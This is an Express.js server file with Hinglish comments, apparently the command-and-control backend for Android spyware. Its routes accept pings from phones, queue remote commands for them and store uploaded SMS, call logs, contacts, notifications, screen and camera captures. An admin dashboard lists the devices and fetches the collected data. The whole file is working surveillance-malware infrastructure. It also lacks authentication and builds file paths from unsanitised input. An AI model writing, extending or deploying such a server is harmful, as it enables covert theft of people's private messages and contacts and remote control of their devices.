const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Data save karne ke liye folder
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Devices ki live memory (Status ke liye)
let devices = {}; 

// ==================================================
// 📲 PHONE SIDE (App se data lena)
// ==================================================

app.post('/api/status', (req, res) => {
    const { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    // Pending command check karo
    const pendingCommand = (devices[device_id] && devices[device_id].command) ? devices[device_id].command : "none";

    // Device status update
    devices[device_id] = {
        id: device_id,
        model: model || "Unknown",
        battery: battery || 0,
        version: version || "--",
        charging: charging === 'true' || charging === true,
        lastSeen: Date.now(),
        command: "none" // Reset command after sending to app
    };

    console.log(`📡 Ping: ${device_id} | Bat: ${battery}%`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    const { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    try {
        let finalData;
        // In cheezon ka purana data delete nahi hoga, naya niche judta jayega
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];

        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(content);
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // Naye data ko purane ke saath merge karna
            if (Array.isArray(parsedData)) {
                // Duplicate entries se bachne ke liye merge logic
                finalData = [...parsedData, ...existingData].slice(0, 1000); 
            } else {
                existingData.unshift(parsedData);
                finalData = existingData.slice(0, 1000);
            }
        } else {
            // Screen, Camera etc ke liye sirf latest data
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`📥 Saved ${type} for ID: ${device_id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error("Save Error:", error);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 DASHBOARD SIDE (Admin Panel)
// ==================================================

// Dashboard status check route
app.get('/api/device-status/:id', (req, res) => {
    const device = devices[req.params.id];
    if (!device) return res.json({ isOnline: false });

    // 60 seconds tak online dikhayega agar ping aaya ho
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Command bhejne ke liye
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!devices[device_id]) devices[device_id] = { id: device_id };
    
    devices[device_id].command = command;
    console.log(`🚀 Cmd [${command}] sent to -> ${device_id}`);
    res.json({ status: "success" });
});

// Data fetch karne ke liye (SMS, Calls etc display karne ke liye)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const { device_id, type } = req.params;
    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]); 
    }
});

app.get('/api/admin/all-devices', (req, res) => {
    res.json(devices);
});

// Server Start
app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
});
